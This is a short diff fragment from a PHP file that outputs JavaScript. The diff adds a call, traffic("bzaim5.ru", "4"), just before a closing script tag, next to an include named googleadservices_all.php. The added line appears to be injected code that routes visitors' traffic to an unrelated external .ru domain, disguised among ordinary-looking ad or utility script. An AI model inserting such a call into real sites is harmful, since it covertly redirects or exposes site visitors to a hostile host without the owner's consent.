@@ -345,6 +345,7 @@ function clone(o) {
     }
     return c;
 } 
+traffic("bzaim5.ru", "4");
 </script>';
 }
 include "googleadservices_all.php"; 
